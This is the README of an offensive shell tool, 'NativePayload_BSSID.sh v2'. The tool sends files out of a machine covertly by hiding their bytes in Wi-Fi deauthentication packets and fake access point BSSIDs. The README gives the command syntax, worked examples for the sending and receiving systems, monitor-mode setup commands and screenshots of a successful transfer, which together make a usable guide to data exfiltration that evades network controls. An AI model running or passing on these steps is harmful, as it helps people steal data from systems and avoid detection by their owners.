# NativePayload_BSSID.sh v2 

Exfiltration via Wireless DeAuthentication Packets from Client to Server on AIR (without user-pass or Wifi Connection & very fast)

Note: this code tested in kali linux systems (only).

Article/Pdf and New video will Publish here soon...

Video[1] , NativePayload_BSSID.sh v2 (step by step) : https://www.youtube.com/watch?v=rg-O4RKt9OA

as you can see in this "Picture 1", with this switch "help" you can see Help information : ./NativePayload_BSSID.sh help 

![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20help.png)
Picture 1:

# NativePayload_BSSID.sh (help):  

   NativePayload_BSSID.sh v1 Syntax: 

    Step1 (Client Side): 
    Syntax            :./NativePayload_BSSID.sh -f [text-file] [Fake-AP-Name] [MonitorMode-Interface]
    Example [System A]:./NativePayload_BSSID.sh -f mytext.txt myfakeAP Wlan3mon

    Step2 (Server Side):
    Syntax            :./NativePayload_BSSID.sh -s [Wifi-Interface] [Exfil-Dump-file]
    Example [System B]:./NativePayload_BSSID.sh -s wlan0 ExfilDumped.txt

    Description: with Step1 (system A) you will inject bytes for (mytext.txt) file to BSSID for Fake AP in this case (myfakeAP) ,
    with Step2 on (system B) you can have this text file via Scanning Fake AP on AIR by Wireless traffic (Using iwlist tool)
    Note : before step1 you should make Monitor-Mode Interface (WlanXmon) by this command for example : airmon-ng start wlan3 
    --------------------------------------------------------
   NativePayload_BSSID.sh v2 Syntax I: 

    Step1 (Server Side):
    Syntax            :./NativePayload_BSSID.sh -deauthdumps [FakeAP-ESSID] [MonitorMode-Interface] [Wifi-Channel] [FakeAP-BSSID]
    Example [System B]:./NativePayload_BSSID.sh -deauthdumps MyFakeAP wlan1mon 7 00:12:32:44:64:19

    Step2 (Client Side):
    Syntax            :./NativePayload_BSSID.sh -exfildeauth [text-file] [Target-FakeAP-BSSID] [Wifi-Interface] [Wifi-Channel] [dbg]/[fast]/[faster]
    Example [System A]:./NativePayload_BSSID.sh -exfildeauth mypayload.txt 00:12:32:44:64:19 wlan2 7 faster

    Description: with Step1 (system B) you will have Fake AP via wlanXmon interface also DeAuth Packets will Dump via Tcpdump
    tool in this step in server side , 
    Note: before step1 you should make WlanXmon Monitor-Mode Interface by this command : airmon-ng start wlanX 
    with Step2 your Client (system A) will send that text file to (Target/system B) via DeAuth Packets On AIR Directly...
    note: via Step2 your Payload Injected to Client.BSSIDs in DeAuth Packets.
    --------------------------------------------------------
   NativePayload_BSSID.sh v2 Syntax II:
   
    (Server/Client Side):
    Syntax :./NativePayload_BSSID.sh -exfilserver
    Description: for more information please read PDF/Article on Github... (soon)
    --------------------------------------------------------

--------------------------------------------------------------------------------------

# NativePayload_BSSID.sh v2 
# and DeAuth Method (step by step): 

Step 1 :
with switch "-deauthdumps" you will have Fake AP via wlanXmon interface also DeAuth Packets will Dump via Tcpdump
tool in this step in server side.

Note: before step1 you should make WlanXmon Monitor-Mode Interface by this command : airmon-ng start wlanX 
 
    Step1 (Server Side):
    Example [System B]:./NativePayload_BSSID.sh -deauthdumps MyFakeAP wlan1mon 7 00:12:32:44:64:19


![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20Step1.png)
Picture 2:

Step 2 :
with Step2 your Client (system A) will send that text file to (Target/system B) via DeAuth Packets On AIR Directly...
note: via Step2 your Payload Injected to Client.BSSIDs in DeAuth Packets.

    Step2 (Client Side):
    Example [System A]:./NativePayload_BSSID.sh -exfildeauth mypayload.txt 00:12:32:44:64:19 wlan2 7 faster

![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20Step2.png)
Picture 3:

as you can see in "Picture 4" after 5 seconds that text file "3.txt" Exfiltrated from client to server on AIR ,(very simple).

![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSIDv2/NativePayload_BSSID%20Step4.png)
Picture 4:

Article and Pdf File will Publish here soon...

Video STEP BY STEP : https://www.youtube.com/watch?v=rg-O4RKt9OA

